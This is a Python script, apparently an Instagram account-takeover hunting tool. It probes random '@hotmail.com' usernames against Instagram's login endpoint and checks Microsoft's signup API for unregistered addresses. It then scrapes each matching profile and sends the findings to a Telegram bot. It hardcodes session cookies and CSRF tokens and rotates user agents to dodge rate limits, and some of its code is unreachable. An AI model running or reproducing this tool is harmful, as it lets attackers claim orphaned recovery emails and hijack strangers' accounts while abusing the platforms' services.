import requests
import time
import os
import threading
import random
from user_agent import *
from uuid import *
from secrets import *
import json
import webbrowser
webbrowser.open('')
uuuid = str(uuid4())

cik = token_hex(8) *2
#_______________________________
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # بني
a3 = '\x1b[1;32m'  # سمائي
a4 = '\x1b[1;33m'  # أسود
a5 = '\x1b[38;5;208m'  # برتقالي
#_______________________________

a = 0
b= 0
c = 0
d = 0 

ID = input('Enter iD => ')

token = input('Enter token => ')
os.system('clear')
def ss():
	global a,b,c,d
	while True:
		yy = '56789'
		
		num = int(''.join(random.choice(yy)for r in range(1)))
		
		numper = 'qwertyuiopasdfghjklzxcvbnm1234567890_.'
		
		email = str("".join(random.choice(numper)for r in range(num)))
		
		cookies = {
		    'csrftoken': 'KPetPvRMEsM6qZ70bt442W',
		    'mid': 'aFqljQABAAHR0ZeL32m257m36-ZE',
		    'datr': 'jaVaaNCP8oCk22qL-7tw1N1V',
		    'ig_did': '9CDCB403-57D2-4ABD-B72C-DEE6910A4459',
		    'ig_nrcb': '1',
		    'dpr': '3.0234789848327637',
		    'wd': '891x1671',
		}
		
		headers = {
		    'authority': 'www.instagram.com',
		    'accept': '*/*',
		    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
		    'content-type': 'application/x-www-form-urlencoded',
		    # 'cookie': 'csrftoken=KPetPvRMEsM6qZ70bt442W; mid=aFqljQABAAHR0ZeL32m257m36-ZE; datr=jaVaaNCP8oCk22qL-7tw1N1V; ig_did=9CDCB403-57D2-4ABD-B72C-DEE6910A4459; ig_nrcb=1; dpr=3.0234789848327637; wd=891x1671',
		    'origin': 'https://www.instagram.com',
		    'referer': 'https://www.instagram.com/',
		    'sec-ch-prefers-color-scheme': 'dark',
		    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
		    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-model': '""',
		    'sec-ch-ua-platform': '"Linux"',
		    'sec-ch-ua-platform-version': '""',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': str(generate_user_agent()),
		    'x-asbd-id': '359341',
		    'x-csrftoken': 'KPetPvRMEsM6qZ70bt442W',
		    'x-ig-app-id': '936619743392459',
		    'x-ig-www-claim': '0',
		    'x-instagram-ajax': '1024379393',
		    'x-requested-with': 'XMLHttpRequest',
		    'x-web-session-id': 'qq7wkk:ngev6o:dzxct1',
		}
		tim = str(time.time()).split(".")[0]
		data = {
		    'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{tim}:bdidbfvfjd',
		    'caaF2DebugGroup': '0',
		    'isPrivacyPortalReq': 'false',
		    'loginAttemptSubmissionCount': '0',
		    'optIntoOneTap': 'false',
		    'queryParams': '{}',
		    'trustedDeviceRecords': '{}',
		    'username': f'{email}@hotmail.com',
		    'jazoest': '21805',
		}
		
		response = requests.post('https://www.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data).text
		
		if '"user":true' in response:
			
			print(f'GOOD.INS : {email}')
		
			cookies = {
			    'logonLatency': 'LGN01=638870576680228512',
			    'mkt': 'ar-EG',
			    'mkt1': 'ar-EG',
			    'amsc': 'I9GcUzVc9fQ+q2/YnKokWIjgAhjCotcpoHCUdF1PzICzB0gIQWHoIVcQbM0EQFRHGC/fkdqWJUkEYVCojjaubaBxT5+cYr3yEXD3r+DWxyBhu/96Q/5QyufgeXlF7GdLUSW2EPygN32HoLLYIt90jxqv0+r3StYvhczIQy6702WmxPVx1jzIf8jC5TYtT/mHeIyVBanaL7X02BDtXKtc3fjUoZ6cGAi4taJWsYdXKXd+fiBfUnIVG+Ehz2TurgGXGnIwPQVwXSFubQchYnp9XEYtBJGtgeoEMlvzPll+pec=:2:3c',
			    'MUID': '91448140a96a48bcac6f931e83c606dd',
			    'ai_session': 'IqCnJ27LT79KhZp3cPGKD1|1751461011367|1751461011367',
			    'fptctx2': 'taBcrIH61PuCVH7eNCyH0OPzOrGnaCb%252f7mTjN%252fuIW2tZIOwmRs3odWN1Drz7X%252fqBZOR3MNxHWCca6H8vJSJfi8r8E4aaF7bJu2bBupED%252frYZhyPFetLEOWJSBo4FWKZHdK%252bAkTE2Cnx%252bnDh5pMUN7%252fsHGgq1I45PHlBVGwAW%252fAywepR%252fkDD9owVgntzOuklF93%252bRliUPBxMmfcBrpg1kTiQBL59db81nRwkKnPBbiQ8B8DMnk%252fv4HQVW%252b7O1WNkNSs3kwoAVUHvG8ubjczfuHbMbV63WPodovTUbJFtVn9RShoN5ULRHiy9IvzO0MgTcE7FlA8bZIxeBI%252fr3bW%252fAEQ%253d%253d',
			    'MSFPC': 'GUID=0eca0b194c004e3fae76cdcd5b611c2e&HASH=0eca&LV=202507&V=4&LU=1751460973088',
			    '_pxvid': '0a368e4d-5744-11f0-b212-7cc227b7adf2',
			    '_px3': 'b2c6a481f26826cee2d39f4f7f3d4dfc3aac955a3bc8238e5a8e1e512db3e311:Byk9WJZH9UsI7fnP9c1fLZhT63FmbgMM34GjSxntIW7/7UQASXHjXtlTRU8neURtDEfPPBH3SCCX5DOWu4AA1A==:1000:bqcVNb8Adh40A4YPSDEeO7wGOfnQNNQSD1mrVQZn4RJxt1KpBol7PBwUkJ4S3wErXIhvUDT+Q7ys15AvcvYGCJ+aLQLOpLZ/NHo55+pA5CJeeiWJgsFBSc8Do3QYAXAUAOiXxWXy3NtSFEPX7ouLwQ+37W+ahxpAQvINpMVUll7t8inwtqzTJj0eimxtVpBL1mOkzM7UMVKLOF3IGq4Ins5a/KU+4Hd/pV8WHSuHogY=',
			    '_pxde': 'c5983855f7f0cc816c8c7a4217dac6307b1e29c4c5c32b2b0903f19ccfe8f3ae:eyJ0aW1lc3RhbXAiOjE3NTE0NjEwMjAyMjcsImZfa2IiOjAsImluY19pZCI6WyIxNTZhMWVmZGUzZGVlNzk2ZjM1YzdiNzMyM2JlNzliYSIsImQyYjgwNTljYTAzNjc2YTFkM2FlZjIzMzk0ODg0OWM3Il19',
			}
			
			headers = {
			    'Accept': 'application/json',
			    'Accept-Language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
			    'Connection': 'keep-alive',
			    'Content-Type': 'application/json; charset=utf-8',
			    # 'Cookie': 'logonLatency=LGN01=638870576680228512; mkt=ar-EG; mkt1=ar-EG; amsc=I9GcUzVc9fQ+q2/YnKokWIjgAhjCotcpoHCUdF1PzICzB0gIQWHoIVcQbM0EQFRHGC/fkdqWJUkEYVCojjaubaBxT5+cYr3yEXD3r+DWxyBhu/96Q/5QyufgeXlF7GdLUSW2EPygN32HoLLYIt90jxqv0+r3StYvhczIQy6702WmxPVx1jzIf8jC5TYtT/mHeIyVBanaL7X02BDtXKtc3fjUoZ6cGAi4taJWsYdXKXd+fiBfUnIVG+Ehz2TurgGXGnIwPQVwXSFubQchYnp9XEYtBJGtgeoEMlvzPll+pec=:2:3c; MUID=91448140a96a48bcac6f931e83c606dd; ai_session=IqCnJ27LT79KhZp3cPGKD1|1751461011367|1751461011367; fptctx2=taBcrIH61PuCVH7eNCyH0OPzOrGnaCb%252f7mTjN%252fuIW2tZIOwmRs3odWN1Drz7X%252fqBZOR3MNxHWCca6H8vJSJfi8r8E4aaF7bJu2bBupED%252frYZhyPFetLEOWJSBo4FWKZHdK%252bAkTE2Cnx%252bnDh5pMUN7%252fsHGgq1I45PHlBVGwAW%252fAywepR%252fkDD9owVgntzOuklF93%252bRliUPBxMmfcBrpg1kTiQBL59db81nRwkKnPBbiQ8B8DMnk%252fv4HQVW%252b7O1WNkNSs3kwoAVUHvG8ubjczfuHbMbV63WPodovTUbJFtVn9RShoN5ULRHiy9IvzO0MgTcE7FlA8bZIxeBI%252fr3bW%252fAEQ%253d%253d; MSFPC=GUID=0eca0b194c004e3fae76cdcd5b611c2e&HASH=0eca&LV=202507&V=4&LU=1751460973088; _pxvid=0a368e4d-5744-11f0-b212-7cc227b7adf2; _px3=b2c6a481f26826cee2d39f4f7f3d4dfc3aac955a3bc8238e5a8e1e512db3e311:Byk9WJZH9UsI7fnP9c1fLZhT63FmbgMM34GjSxntIW7/7UQASXHjXtlTRU8neURtDEfPPBH3SCCX5DOWu4AA1A==:1000:bqcVNb8Adh40A4YPSDEeO7wGOfnQNNQSD1mrVQZn4RJxt1KpBol7PBwUkJ4S3wErXIhvUDT+Q7ys15AvcvYGCJ+aLQLOpLZ/NHo55+pA5CJeeiWJgsFBSc8Do3QYAXAUAOiXxWXy3NtSFEPX7ouLwQ+37W+ahxpAQvINpMVUll7t8inwtqzTJj0eimxtVpBL1mOkzM7UMVKLOF3IGq4Ins5a/KU+4Hd/pV8WHSuHogY=; _pxde=c5983855f7f0cc816c8c7a4217dac6307b1e29c4c5c32b2b0903f19ccfe8f3ae:eyJ0aW1lc3RhbXAiOjE3NTE0NjEwMjAyMjcsImZfa2IiOjAsImluY19pZCI6WyIxNTZhMWVmZGUzZGVlNzk2ZjM1YzdiNzMyM2JlNzliYSIsImQyYjgwNTljYTAzNjc2YTFkM2FlZjIzMzk0ODg0OWM3Il19',
			    'Origin': 'https://signup.live.com',
			    'Referer': 'https://signup.live.com/signup?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d3073%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-EG%26opid%3d36E05CB0946B5DEF%26opidt%3d1751460974%26uaid%3d531b700aaedcbfd3b5721e630a651b7e%26contextid%3d0CC7D5C38E5F0700%26opignore%3d1&mkt=AR-EG&uiflavor=web&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=531b700aaedcbfd3b5721e630a651b7e&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
			    'Sec-Fetch-Dest': 'empty',
			    'Sec-Fetch-Mode': 'cors',
			    'Sec-Fetch-Site': 'same-origin',
			    'User-Agent': str(generate_user_agent()),
			    'canary': 'EkJceNxSN9e5n80Es8OIlwKYltMncgmnqCfjaqRFmQeQ9DE2VAtxM+NFvfXnpPtUnsKayczpFZrX+dfMYNbOq5eBmQR32Omw/Q48Qqez/8WbFhG1eyrLGYYH8fykmu6PRwjSXF9O891kfwzDti+EDn+hbJFzeUwjMjsUg8cb/L/Zc8dtD4VmZRnM+T1XmwpZ/xmElxISizBOeFSBLkxsiMoz4ItmzWHuE4S87cUqb+Xqid6RpbSfmluC3dQzWis7:2:3c',
			    'client-request-id': '531b700aaedcbfd3b5721e630a651b7e',
			    'correlationId': '531b700aaedcbfd3b5721e630a651b7e',
			    'hpgact': '0',
			    'hpgid': '200225',
			    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			}
			
			json_data = {
			    'includeSuggestions': True,
			    'signInName': f'{email}@hotmail.com',
			    'uiflvr': 1001,
			    'scid': 100118,
			    'uaid': '531b700aaedcbfd3b5721e630a651b7e',
			    'hpgid': 200225,
			}
			
			response = requests.post(
			    'https://signup.live.com/API/CheckAvailableSigninNames?sru=https%3a%2f%2flogin.live.com%2foauth20_authorize.srf%3flc%3d3073%26client_id%3d9199bf20-a13f-4107-85dc-02114787ef48%26cobrandid%3dab0455a0-8d03-46b9-b18b-df2f57b9e44c%26mkt%3dAR-EG%26opid%3d36E05CB0946B5DEF%26opidt%3d1751460974%26uaid%3d531b700aaedcbfd3b5721e630a651b7e%26contextid%3d0CC7D5C38E5F0700%26opignore%3d1&mkt=AR-EG&uiflavor=web&fl=dob%2cflname%2cwld&cobrandid=ab0455a0-8d03-46b9-b18b-df2f57b9e44c&client_id=9199bf20-a13f-4107-85dc-02114787ef48&uaid=531b700aaedcbfd3b5721e630a651b7e&suc=9199bf20-a13f-4107-85dc-02114787ef48&fluent=2&lic=1',
			    cookies=cookies,
			    headers=headers,
			    json=json_data,
			).text
			
			if '"isAvailable":true' in response:
				print(f'GOOD.HOT : {email}')
			
				
				
				
				cookies = {
				    'ig_did': '14B3CA20-43A7-49DE-A14F-9B805FB50DBB',
				    'csrftoken': 'TdpLp175uY8P7kujPqQtuu',
				    'datr': 'NWFlaC3J3iL-Ki5FInRy3BKm',
				    'mid': 'aGVhYwABAAFFFiKshn6gv7Akg3MC',
				    'ig_nrcb': '1',
				    'wd': '891x1671',
				    'dpr': '3.0234789848327637',
				}
				
				headers = {
				    'authority': 'www.instagram.com',
				    'accept': '*/*',
				    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
				    # 'cookie': 'ig_did=14B3CA20-43A7-49DE-A14F-9B805FB50DBB; csrftoken=TdpLp175uY8P7kujPqQtuu; datr=NWFlaC3J3iL-Ki5FInRy3BKm; mid=aGVhYwABAAFFFiKshn6gv7Akg3MC; ig_nrcb=1; wd=891x1671; dpr=3.0234789848327637',
				    'referer': 'https://www.instagram.com/dfff/',
				    'sec-ch-prefers-color-scheme': 'dark',
				    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
				    'sec-ch-ua-full-version-list': '"Chromium";v="137.0.7337.0", "Not/A)Brand";v="24.0.0.0"',
				    'sec-ch-ua-mobile': '?0',
				    'sec-ch-ua-model': '""',
				    'sec-ch-ua-platform': '"Linux"',
				    'sec-ch-ua-platform-version': '""',
				    'sec-fetch-dest': 'empty',
				    'sec-fetch-mode': 'cors',
				    'sec-fetch-site': 'same-origin',
				    'user-agent': str(generate_user_agent()),
				    'x-asbd-id': '359341',
				    'x-csrftoken': 'TdpLp175uY8P7kujPqQtuu',
				    'x-ig-app-id': '936619743392459',
				    'x-ig-www-claim': '0',
				    'x-requested-with': 'XMLHttpRequest',
				    'x-web-session-id': '7amvl0:f9ahr5:mzqa1q',
				}
				
				params = {
				    'username': email,
				}
				try:
				    response = requests.get(
				    'https://www.instagram.com/api/v1/users/web_profile_info/',
				    params=params,
				    cookies=cookies,
				    headers=headers,
				).json()
				except json.decoder.JSONDecodeError:
					continue
					if response.status_code == 404 or "Page Not Found" in response:
					   print(f"🚫 الحساب غير موجود : {email}")
      

					
				
				
					
							
			
				  
		
				
				
				
				io = response['data']['user'][ 'biography']
				fol = response['data']['user']['edge_followed_by']['count']
				fos = response['data']['user']['edge_follow']['count']
				ido = response['data']['user']['id']
				nam = response['data']['user']['full_name']
																
				isp = response['data']['user']['is_private']
				op = response['data']['user']['edge_owner_to_timeline_media']['count']
																
				ff = f'''
				╔══✪〘@v6655〙✪══╗
				[*] NAME        : {nam}
				[*] USER        : {email}
				[*] EMAIL       : {email}
				[*] FOLLOWERS   : {fol}
				[*] FOLLOWING   : {fos}
				[*] ID          : {ido}
				[*] POSTS       : {op}
				[*] LINK        : https://www.instagram.com/{email}
				____________(@v6655)_____________
				'''
				print(ff)
								
												
				tlg = (f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={ff}')
				i = requests.post(tlg)								
				
				
		
				
			else:

				print(f'BAD.HOT : {email}')
		
		
				
		else:
			print(f'BAD.INS : {email}')
			
			

ss()	